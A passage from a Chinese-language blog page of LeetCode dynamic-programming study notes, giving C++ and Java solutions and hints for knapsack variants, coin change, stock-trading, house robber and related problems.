class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">longestCommonSubsequence</span><span class="params">(string text1, string text2)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len1 = text<span class="number">1.l</span>ength();</span><br><span class="line">        <span class="type">int</span> len2 = text<span class="number">2.l</span>ength();</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(len1 + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(len2 + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= len1; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= len2; ++j) &#123;</span><br><span class="line">                <span class="keyword">if</span> (text1[i - <span class="number">1</span>] == text2[j - <span class="number">1</span>])</span><br><span class="line">                    dp[i][j] = dp[i - <span class="number">1</span>][j - <span class="number">1</span>] + <span class="number">1</span>;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                    dp[i][j] = <span class="built_in">max</span>(dp[i][j - <span class="number">1</span>], dp[i - <span class="number">1</span>][j]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[len1][len2];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：使用二维dp来记录，dp[i][j]记录的是text1.length&lt;&#x3D;1，text2.length&lt;&#x3D;j时最大的公共子长度。</p></li></ul><h2 id="五、背包问题"><a href="#五、背包问题" class="headerlink" title="五、背包问题"></a>五、背包问题</h2><ul><li><p>算法解释：背包问题(knapsack problem)是一种组合优化的NP完全问题：有n个物品和载重为w的背包，每个物品都有自己的重量weight和价值value，求拿哪些物品可以使得背包所装下物品的总价值最大。如果限定每种物品只能选择0个或1个，则问题称为<strong>0-1背包问题(0-1 knapsack)</strong>；如果不限定每种物品的数量，则问题称为<strong>无界背包问题或完全背包问题(unbounded knapsack)</strong>。我们可以用动态规划来解决背包问题。以0-1背包问题为例。</p></li><li><p>0-1背包问题：</p><ul><li>分析：我们可以定义一个二维数组dp存储最大价值，其中dp[i][j]表示前i件物品重量不超过j的情况下能达到的最大价值。在我们遍历到第i件物品时，在当前背包总载重为j的情况下，如果我们不将物品i放入背包，那么dp[i][j]&#x3D;dp[i-1][j]，即前i个物品的最大价值等于只取前i-1个物品时的最大价值；如果我们将物品i放入背包，假设第i件物品重量为weight，价值为value，那么我们得到dp[i][j]&#x3D;dp[i-1][j-weight]+value。我们只需在遍历过程中对这两种情况取最大值即可，总时间复杂度和空间复杂度都为O(nw)。</li><li>状态转移矩阵示例：<br><img src="https://noworneverev.github.io/leetcode_101/assets/images/6.3-c71586b9976f87e73a4366dab403bfe6.png" alt="示例"></li><li>代码：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">knapsack</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights, vector&lt;<span class="type">int</span>&gt; values, <span class="type">int</span> n, <span class="type">int</span> w)</span> </span>&#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(w + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> weight = weights[i - <span class="number">1</span>], value = values[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= w; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &gt;= weight) &#123;</span><br><span class="line">                dp[i][j] = <span class="built_in">max</span>(dp[i - <span class="number">1</span>][j], dp[i - <span class="number">1</span>][j - weight] + value);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n][w];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>代码2(空间复杂度为O(w))：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">knapsack</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights, vector&lt;<span class="type">int</span>&gt; values, <span class="type">int</span> n, <span class="type">int</span> w)</span> </span>&#123;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(w + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> weight = weights[i - <span class="number">1</span>], value = values[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = w; j &gt;= weight; --j) &#123;</span><br><span class="line">            dp[j] = <span class="built_in">max</span>(dp[j], dp[j - weight] + value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[w];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>无界背包问题</p><ul><li>分析：在完全背包问题中，一个物品可以拿多次。如图上半部分所示，假设我们遍历到物品i&#x3D;2，且其重量为weight&#x3D;2，价值为value&#x3D;3；对于背包载重j&#x3D;5，最多只能装下2个该物品。那么我们的状态转移方程就变成了dp[2][5]&#x3D;max(dp[1][5], dp[1][3]+3, dp[1][1]+6)。如果采用这种方法，假设背包载重无穷大而物体的重量无穷小，我们这里的比较次数也会趋近于无穷大，远超O(nw)的时间复杂度。怎么解决这个问题呢？我们发现在dp[2][3]的时候我们其实已经考虑了dp[1][3]和dp[2][1]的情况，而在时dp[2][1]也已经考虑了dp[1][1]的情况。因此，如图下半部分所示，对于拿多个物品的情况，我们只需考虑dp[2][3]即可，即dp[2][5]&#x3D;max(dp[1][5], dp[2][3]+3)。这样，我们就得到了完全背包问题的状态转移方程：dp[i][j]&#x3D;max(dp[i-1][j], dp[i][j-w]+v)，其与0-1背包问题的差别仅仅是把状态转移方程中的第二个i-1变成了i。</li><li>状态转移矩阵示例：<br><img src="https://noworneverev.github.io/leetcode_101/assets/images/6.4-0db4e8ce37dca2dd4fae73b98a7ff67a.png" alt="示例"></li><li>代码：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">knapsack</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights, vector&lt;<span class="type">int</span>&gt; values, <span class="type">int</span> n, <span class="type">int</span> w)</span> </span>&#123;</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(w + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> weight = weights[i - <span class="number">1</span>], value = values[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= w; ++j) &#123;</span><br><span class="line">            <span class="keyword">if</span> (j &gt;= weight) &#123;</span><br><span class="line">                dp[i][j] = <span class="built_in">max</span>(dp[i - <span class="number">1</span>][j], dp[i][j - weight] + value);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                dp[i][j] = dp[i - <span class="number">1</span>][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[n][w];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>代码2(空间复杂度为O(w))：<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">knapsack</span><span class="params">(vector&lt;<span class="type">int</span>&gt; weights, vector&lt;<span class="type">int</span>&gt; values, <span class="type">int</span> n, <span class="type">int</span> w)</span> </span>&#123;</span><br><span class="line">    <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(w + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">        <span class="type">int</span> weight = weights[i - <span class="number">1</span>], value = values[i - <span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = weight; j &lt;= w; ++j) &#123;</span><br><span class="line">            dp[j] = <span class="built_in">max</span>(dp[j], dp[j - weight] + value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dp[w];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>题目一：<a href="https://leetcode.cn/problems/partition-equal-subset-sum">分割等和子集</a><br>给你一个只包含正整数的非空数组nums。请你判断是否可以将这个数组分割成两个子集，使得两个子集的元素和相等。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">canPartition</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> sum = <span class="built_in">accumulate</span>(nums.<span class="built_in">begin</span>(), nums.<span class="built_in">end</span>(), <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (sum % <span class="number">2</span> == <span class="number">1</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> target = sum / <span class="number">2</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(target + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="type">int</span> weight = nums[i - <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = target; j &gt;= weight; --j) &#123;</span><br><span class="line">                dp[j] = <span class="built_in">max</span>(dp[j], dp[j - weight] + weight);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[target] == target;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：注意这道题没有value且要知道背包的容量为sum&#x2F;2。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/ones-and-zeroes">一和零</a><br>给定m个数字0和n个数字1，以及一些由0-1构成的字符串，求利用这些数字最多可以构成多少个给定的字符串，字符串只可以构成一次。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">findMaxForm</span><span class="params">(vector&lt;string&gt;&amp; strs, <span class="type">int</span> m, <span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> len = strs.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">weights0</span><span class="params">(len, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">weights1</span><span class="params">(len, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">char</span> c : strs[i]) &#123;</span><br><span class="line">                <span class="keyword">if</span> (c == <span class="string">&#x27;0&#x27;</span>) ++weights0[i];</span><br><span class="line">                <span class="keyword">else</span> ++weights1[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">dp</span>(m + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n + <span class="number">1</span>, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = m; j &gt;= weights0[i]; --j) &#123;</span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> k = n; k &gt;= weights1[i]; --k) &#123;</span><br><span class="line">                    dp[j][k] = <span class="built_in">max</span>(dp[j][k], dp[j - weights0[i]][k - weights1[i]] + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[m][n];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：本质上是一个双重背包。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/coin-change">零钱交换</a><br>给定一些硬币的面额，求最少可以用多少颗硬币组成给定的金额，硬币可以重复使用。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">coinChange</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; coins, <span class="type">int</span> amount)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(amount + <span class="number">1</span>, <span class="number">10001</span>)</span></span>;</span><br><span class="line">        dp[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; coins.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = coins[i]; j &lt;= amount; ++j) &#123;</span><br><span class="line">                dp[j] = <span class="built_in">min</span>(dp[j], dp[j - coins[i]] + <span class="number">1</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> dp[amount] == <span class="number">10001</span> ? <span class="number">-1</span> : dp[amount];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：很典型的无限背包问题。</p></li></ul><h2 id="六、股票问题"><a href="#六、股票问题" class="headerlink" title="六、股票问题"></a>六、股票问题</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock">买卖股票的最佳时机</a><br>给定一段时间内每天某只股票的固定价格，已知你只可以买卖各一次，求最大的收益。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> minSale = prices[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; prices.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">if</span> (prices[i] &lt; minSale) minSale = prices[i];</span><br><span class="line">            <span class="keyword">else</span> res = <span class="built_in">max</span>(res, prices[i] - minSale);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：简单题，使用贪心思想即可。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-iv">买卖股票的最佳时机 IV</a><br>给定一段时间内每天某只股票的固定价格，已知你只可以买卖各k次，且每次只能拥有一支股票，求最大的收益。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(<span class="type">int</span> k, vector&lt;<span class="type">int</span>&gt;&amp; prices)</span> </span>&#123;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">buy</span><span class="params">(k + <span class="number">1</span>, <span class="number">-1001</span>)</span>, <span class="title">sell</span><span class="params">(k + <span class="number">1</span>, <span class="number">0</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; prices.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">1</span>; j &lt;= k; ++j) &#123;</span><br><span class="line">                buy[j] = <span class="built_in">max</span>(buy[j], sell[j - <span class="number">1</span>] - prices[i]);</span><br><span class="line">                sell[j] = <span class="built_in">max</span>(sell[j], buy[j] + prices[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sell[k];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：需要用两个数组来维护状态，思考一下状态转换的关系。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/best-time-to-buy-and-sell-stock-with-cooldown">买卖股票的最佳时机含冷冻期</a><br>给定一段时间内每天某只股票的固定价格，已知每次卖出之后必须冷却一天，且每次只能拥有一支股票，求最大的收益。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">maxProfit</span><span class="params">(vector&lt;<span class="type">int</span>&gt; &amp;prices)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = prices.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">buy</span><span class="params">(n)</span>, <span class="title">sell</span><span class="params">(n)</span>, <span class="title">s1</span><span class="params">(n)</span>, <span class="title">s2</span><span class="params">(n)</span></span>;</span><br><span class="line">        s1[<span class="number">0</span>] = buy[<span class="number">0</span>] = -prices[<span class="number">0</span>];</span><br><span class="line">        sell[<span class="number">0</span>] = s2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            buy[i] = s2[i - <span class="number">1</span>] - prices[i];</span><br><span class="line">            s1[i] = <span class="built_in">max</span>(buy[i - <span class="number">1</span>], s1[i - <span class="number">1</span>]);</span><br><span class="line">            sell[i] = <span class="built_in">max</span>(buy[i - <span class="number">1</span>], s1[i - <span class="number">1</span>]) + prices[i];</span><br><span class="line">            s2[i] = <span class="built_in">max</span>(s2[i - <span class="number">1</span>], sell[i - <span class="number">1</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(sell[n - <span class="number">1</span>], s2[n - <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：考虑如下状态转换图，这道题还有二维dp的做法，二维dp的做法也可以被压缩成一维dp的做法。<br><img src="https://noworneverev.github.io/leetcode_101/assets/images/6.5-91923e38e2992faf249854d49cd28aa0.png" alt="状态转换图"></p></li></ul><h2 id="七、练习"><a href="#七、练习" class="headerlink" title="七、练习"></a>七、练习</h2><ul><li><p>题目一：<a href="https://leetcode.cn/problems/house-robber-ii">打家劫舍 II</a><br>你是一个专业的小偷，计划偷窃沿街的房屋，每间房内都藏有一定的现金。这个地方所有的房屋都围成一圈，这意味着第一个房屋和最后一个房屋是紧挨着的。同时，相邻的房屋装有相互连通的防盗系统，如果两间相邻的房屋在同一晚上被小偷闯入，系统会自动报警。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">rob</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> prev = <span class="number">0</span>, pevPrev = <span class="number">0</span>, cur1 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>; ++i) &#123;</span><br><span class="line">            cur1 = <span class="built_in">max</span>(pevPrev + nums[i], prev);</span><br><span class="line">            pevPrev = prev;</span><br><span class="line">            prev = cur1;</span><br><span class="line">        &#125;</span><br><span class="line">        prev = <span class="number">0</span>, pevPrev = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> cur2 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt; n; ++i) &#123;</span><br><span class="line">            cur2 = <span class="built_in">max</span>(pevPrev + nums[i], prev);</span><br><span class="line">            pevPrev = prev;</span><br><span class="line">            prev = cur2;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">max</span>(cur1, cur2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>提示：处理一下首尾，分开算一遍即可。</p></li><li><p>题目二：<a href="https://leetcode.cn/problems/maximum-subarray">最大子数组和</a><br>给你一个整数数组nums，请你找出一个具有最大和的连续子数组(子数组最少包含一个元素)，返回其最大和。</p><p>解答：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">maxSubArray</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">pre</span> <span class="operator">=</span> nums[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt; nums.length; i ++) &#123;</span><br><span class="line">            pre = Math.max(pre + nums[i], nums[i]);</span><br><span class="line">            res = Math.max(pre, res);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>提示：要么加入当前的，要么重新从当前的重新开始。</p></li><li><p>题目三：<a href="https://leetcode.cn/problems/integer-break">整数拆分</a><br>给定一个正整数n，将其拆分为k个正整数的和(k&gt;&#x3D;2)，并使这些整数的乘积最大化。</p><p>解答：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">integerBreak</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n &lt;= <span class="number">3</span>) <span class="keyword">return</span> n - <span class="number">1</span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">dp</span><span class="params">(n + <span class="number">1</span>, <span class="number">1</span>)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            dp[i] = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">4</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">2</span>; j &lt; i; ++j) &#123;</span><br><span class="line">                dp[i] = <span 